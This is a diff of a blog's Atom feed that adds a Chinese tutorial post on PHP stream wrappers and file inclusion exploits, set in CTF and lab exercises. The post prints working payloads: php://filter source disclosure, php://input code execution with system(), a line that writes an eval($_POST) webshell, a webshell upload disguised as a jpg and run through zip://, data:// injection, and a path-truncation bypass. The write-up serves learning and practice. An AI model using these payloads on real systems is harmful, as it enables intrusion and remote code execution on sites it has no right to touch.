@@ -3,16 +3,141 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;文件包含探究&#34; tag</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-10-20T15:49:56.000Z</updated>
+    <updated>2022-10-20T15:55:08.000Z</updated>
     <category term="原创" />
-    <category term="SQL注入探究" />
     <category term="G计划" />
-    <category term="数据库安全" />
+    <category term="SQL注入探究" />
     <category term="XSS跨站脚本攻击探究" />
-    <category term="文件上传漏洞探究" />
+    <category term="数据库安全" />
     <category term="文件包含探究" />
+    <category term="文件上传漏洞探究" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
+        <title>文件包含进阶（二）</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+        <content type="html">&lt;h1 id=&#34;文件包含进阶二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件包含进阶二&#34;&gt;#&lt;/a&gt; 文件包含进阶（二）&lt;/h1&gt;
+&lt;p&gt;本篇讲述伪协议相关内容&lt;/p&gt;
+&lt;h1 id=&#34;php伪协议php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php伪协议php&#34;&gt;#&lt;/a&gt; php 伪协议 php://&lt;/h1&gt;
+&lt;p&gt;php:// — 访问各个输入 / 输出流（I/O streams）&lt;/p&gt;
+&lt;h2 id=&#34;说明&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#说明&#34;&gt;#&lt;/a&gt; 说明&lt;/h2&gt;
+&lt;p&gt;PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。&lt;/p&gt;
+&lt;h3 id=&#34;phpstdin-phpstdout-和-phpstderr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpstdin-phpstdout-和-phpstderr&#34;&gt;#&lt;/a&gt; php://stdin, php://stdout 和 php://stderr&lt;/h3&gt;
+&lt;p&gt;php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 &lt;strong&gt; &lt;code&gt;STDIN&lt;/code&gt; &lt;/strong&gt; 并不受影响。 推荐你简单使用常量 &lt;strong&gt; &lt;code&gt;STDIN&lt;/code&gt; &lt;/strong&gt;、 &lt;strong&gt; &lt;code&gt;STDOUT&lt;/code&gt; &lt;/strong&gt; 和 &lt;strong&gt; &lt;code&gt;STDERR&lt;/code&gt; &lt;/strong&gt; 来代替手工打开这些封装器。&lt;/p&gt;
+&lt;p&gt;php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。&lt;/p&gt;
+&lt;h3 id=&#34;phpinput&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpinput&#34;&gt;#&lt;/a&gt; php://input&lt;/h3&gt;
+&lt;p&gt;php://input 是个可以访问请求的原始数据的只读流。  &lt;code&gt;enctype=&amp;quot;multipart/form-data&amp;quot;&lt;/code&gt;  的时候 php://input 是无效的。&lt;/p&gt;
+&lt;h3 id=&#34;phpoutput&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpoutput&#34;&gt;#&lt;/a&gt; php://output&lt;/h3&gt;
+&lt;p&gt;php://output 是一个只写的数据流， 允许你以 &lt;a href=&#34;https://www.php.net/manual/zh/function.print.php&#34;&gt;print&lt;/a&gt; 和 &lt;a href=&#34;https://www.php.net/manual/zh/function.echo.php&#34;&gt;echo&lt;/a&gt; 一样的方式 写入到输出缓冲区。&lt;/p&gt;
+&lt;h3 id=&#34;phpfd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpfd&#34;&gt;#&lt;/a&gt; php://fd&lt;/h3&gt;
+&lt;p&gt;php://fd 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。&lt;/p&gt;
+&lt;h3 id=&#34;phpmemory-和-phptemp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpmemory-和-phptemp&#34;&gt;#&lt;/a&gt; php://memory 和 php://temp&lt;/h3&gt;
+&lt;p&gt;php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 &lt;a href=&#34;https://www.php.net/manual/zh/function.sys-get-temp-dir.php&#34;&gt;sys_get_temp_dir()&lt;/a&gt; 的方式一致。&lt;/p&gt;
+&lt;p&gt;php://temp 的内存限制可通过添加  &lt;code&gt;/maxmemory:NN&lt;/code&gt;  来控制， &lt;code&gt;NN&lt;/code&gt;  是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。&lt;/p&gt;
+&lt;h3 id=&#34;phpfilter&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpfilter&#34;&gt;#&lt;/a&gt; php://filter&lt;/h3&gt;
+&lt;p&gt;php://filter 是一种元封装器， 设计用于数据流打开时的&lt;a href=&#34;https://www.php.net/manual/zh/filters.php&#34;&gt;筛选过滤&lt;/a&gt;应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 &lt;a href=&#34;https://www.php.net/manual/zh/function.readfile.php&#34;&gt;readfile()&lt;/a&gt;、 &lt;a href=&#34;https://www.php.net/manual/zh/function.file.php&#34;&gt;file()&lt;/a&gt; 和 &lt;a href=&#34;https://www.php.net/manual/zh/function.file-get-contents.php&#34;&gt;file_get_contents()&lt;/a&gt;， 在 &lt;code&gt;数据流内容读取&lt;/code&gt; 之前没有机会应用其他过滤器。&lt;/p&gt;
+&lt;p&gt;php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;php://filter 参数&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;名称&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;resource=&amp;lt;要过滤的数据流&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;read=&amp;lt;读链的筛选列表&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（ &lt;code&gt;|&lt;/code&gt; ）分隔。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;write=&amp;lt;写链的筛选列表&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（ &lt;code&gt;|&lt;/code&gt; ）分隔。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;&amp;lt;；两个链的筛选列表&amp;gt;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;任何没有以  &lt;code&gt;read=&lt;/code&gt;  或  &lt;code&gt;write=&lt;/code&gt;  作前缀 的筛选器列表会视情况应用于读或写链。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;第一题-bugku-文件包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第一题-bugku-文件包含&#34;&gt;#&lt;/a&gt; 第一题 Bugku - 文件包含&lt;/h1&gt;
+&lt;p&gt;打开题目后映入眼帘的是一个超链接，显示要点击&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020210102218.png&#34; alt=&#34;image-20221020210102218&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击后发现是 &lt;code&gt;GET&lt;/code&gt;  请求，参数是 &lt;code&gt;file&lt;/code&gt; ，值是 &lt;code&gt;show.php&lt;/code&gt; ，这很有文件包含的韵味。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020210129622.png&#34; alt=&#34;image-20221020210129622&#34;&gt;&lt;/p&gt;
+&lt;p&gt;本题，我们要使用的是 &lt;code&gt;php://filter&lt;/code&gt; ，说白了就是&lt;strong&gt;为了读取文件&lt;/strong&gt;用的。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;示例  php://filter/read=&amp;lt;读链需要应用的过滤器列表&amp;gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这个参数采用一个或以管道符  &lt;code&gt;|&lt;/code&gt;  分隔的多个过滤器名称。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/* 这会以大写字母输出 www.example.com 的全部内容 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readfile(&amp;quot;php://filter/read=string.toupper/resource=http://www.example.com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/* 这会和以上所做的一样，但还会用 base64 加密。 */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readfile(&amp;quot;php://filter/read=string.toupper|string.base64/resource=http://www.example.com&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;由于前台的代码我们是可以看得到的，后台代码我们能看得到么？&lt;/p&gt;
+&lt;p&gt;可以，前提是存在 &lt;code&gt;文件包含漏洞&lt;/code&gt; ，且使用 GET 请求。&lt;/p&gt;
+&lt;p&gt;然后使用 &lt;code&gt;php://filter/read=&lt;/code&gt; ，配合 &lt;code&gt;conver.base64-encode/resource=xxxxx&lt;/code&gt;  来提取后台的代码内容&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://114.67.175.224:11146/index.php?file=php://filter/read=convert.base64-encode/resource=show.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;得到：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezRjMTVlZGZmZGEwNDkyYWI2MDM2OTA2NTVmNTUzZDdifQ0KPz4NCjwvaHRtbD4NCg== &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;解码：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ï»¿&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;Bugku-web&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[file])&amp;#123;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;a href=&amp;quot;./index.php?file=show.php&amp;quot;&amp;gt;click me? no&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;strstr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;../&amp;quot;&lt;/span&gt;)||&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;tp&amp;quot;&lt;/span&gt;)||&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;input&amp;quot;&lt;/span&gt;)||&lt;span class=&#34;title function_ invoke__&#34;&gt;stristr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Oh no!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//flag:flag&amp;#123;4c15edffda0492ab603690655f553d7b&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;flag 已经出来：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;flag&amp;#123;4c15edffda0492ab603690655f553d7b&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;第二题-php-input命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二题-php-input命令执行&#34;&gt;#&lt;/a&gt; 第二题 php input 命令执行&lt;/h1&gt;
+&lt;p&gt;点击 &lt;code&gt;click&lt;/code&gt;  后会跳转到百度&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020215322462.png&#34; alt=&#34;image-20221020215322462&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们发现 URL 很特殊：&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_input.php?file=http://www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;code&gt;GET&lt;/code&gt;  请求，后面跟着一个 &lt;code&gt;URL&lt;/code&gt; ，我们怀疑其存在文件包含漏洞。&lt;/p&gt;
+&lt;p&gt;尝试输入：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_input.php?file=php://filter/read&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020215459804.png&#34; alt=&#34;image-20221020215459804&#34;&gt;&lt;/p&gt;
+&lt;p&gt;显示 &lt;code&gt;hacker!&lt;/code&gt; ，说明 &lt;code&gt;filter&lt;/code&gt;  伪协议被过滤掉了，不能用&lt;/p&gt;
+&lt;p&gt;我们使用 &lt;code&gt;input&lt;/code&gt;  伪协议&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_input.php?file=php://input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#发送POST请求，在POST参数里写上php代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020215715688.png&#34; alt=&#34;image-20221020215715688&#34;&gt;&lt;/p&gt;
+&lt;p&gt;既然 phpinfo 成功执行，那么可以执行任意 php 语句&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_input.php?file=php://input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system(&amp;quot;dir&amp;quot;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020215836378.png&#34; alt=&#34;image-20221020215836378&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;php&lt;/code&gt;  语句写入一个带一句话木马的文件&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//www.lfi.com/php/php_input.php?file=php://input&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#注意，下面写入一句话时，所用都使用单引号，特别是第二个参数不要用双引号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;fputs&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;fopen&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mywebshell.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[jack]);?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用菜刀连接：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/mywebshell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;找到 &lt;code&gt;flag.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020221400926.png&#34; alt=&#34;image-20221020221400926&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;第三题-zip协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第三题-zip协议&#34;&gt;#&lt;/a&gt; 第三题 zip 协议&lt;/h1&gt;
+&lt;p&gt;打开第三题，我们发现是一个和上传有关的界面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020222841751.png&#34; alt=&#34;image-20221020222841751&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据提示，我们可以上传 &lt;code&gt;jpg&lt;/code&gt; 、 &lt;code&gt;png&lt;/code&gt; 、 &lt;code&gt;zip&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么我们选择上传一个包含有 &lt;code&gt;webshell.php&lt;/code&gt;  的 &lt;code&gt;jpg&lt;/code&gt;  压缩包&lt;/p&gt;
+&lt;p&gt;将其打包后，把 &lt;code&gt;rar&lt;/code&gt;  后缀改成 &lt;code&gt;jpg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020223009765.png&#34; alt=&#34;image-20221020223009765&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击上传，发现后台已经成功接收。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020223343170.png&#34; alt=&#34;image-20221020223343170&#34;&gt;&lt;/p&gt;
+&lt;p&gt;不过我们的目的是让其解析里面的 php 代码，我们需要使用到 zip 协议&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_zip.php?file=zip://C:\phpStudyB\WWW\lfi-labs-master\php\uploads\115a2563174161e1c5176e556e167ff8.jpg%23mywebshell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意：使用 zip 协议时，无论上传的后缀名如何，都会当成一个 zip 看待。&lt;/p&gt;
+&lt;p&gt;使用菜刀连接即可&lt;/p&gt;
+&lt;h1 id=&#34;第四题-data协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第四题-data协议&#34;&gt;#&lt;/a&gt; 第四题 data 协议&lt;/h1&gt;
+&lt;p&gt;有文件包含漏洞， &lt;code&gt;GET&lt;/code&gt;  请求，参数为 &lt;code&gt;file &lt;/code&gt; ，我们尝试使用 &lt;code&gt;data&lt;/code&gt;  协议插入 &lt;code&gt;php&lt;/code&gt;  代码执行&lt;/p&gt;
+&lt;p&gt;注意，data 协议有两种用法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;data://text/plain, + 你想写入的php代码&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;data://text/plain;base64, + xxxxxxxxx代码的base64编码xxxxxxxxx&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_data.php?file=data://text/plain,&amp;lt;?php phpinfo();?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221020230032370.png&#34; alt=&#34;image-20221020230032370&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.lfi.com/php/php_data.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;也是可以的。&lt;/p&gt;
+&lt;h1 id=&#34;第五题-利用操作系统特性绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第五题-利用操作系统特性绕过&#34;&gt;#&lt;/a&gt; 第五题 利用操作系统特性绕过&lt;/h1&gt;
+&lt;p&gt;在上传 &lt;code&gt;backdoor.php&lt;/code&gt;  的时候，如果在后台中被强行加了个 &lt;code&gt;.html&lt;/code&gt;  这样的后缀时&lt;/p&gt;
+&lt;p&gt;我们可以考虑使用 &lt;code&gt;........&lt;/code&gt; (256 个 &lt;code&gt;.&lt;/code&gt; ) 和  &lt;code&gt;././././././&lt;/code&gt; ( &lt;code&gt;128&lt;/code&gt;  个 &lt;code&gt;./&lt;/code&gt; ) 这样的形式进行绕过&lt;/p&gt;
+&lt;p&gt;因为在 windows 中，不允许文件以 &lt;code&gt;.&lt;/code&gt;  和 &lt;code&gt;/&lt;/code&gt;  进行结尾，且长度最大为 &lt;code&gt;256&lt;/code&gt; （ &lt;code&gt;linux&lt;/code&gt;  是 &lt;code&gt;4069&lt;/code&gt; ）。&lt;/p&gt;
+</content>
+        <category term="文件包含探究" />
+        <updated>2022-10-20T15:55:08.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/10/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8E%A2%E7%A9%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6%EF%BC%88%E4%B8%80%EF%BC%89/</id>
         <title>文件包含进阶（一）</title>
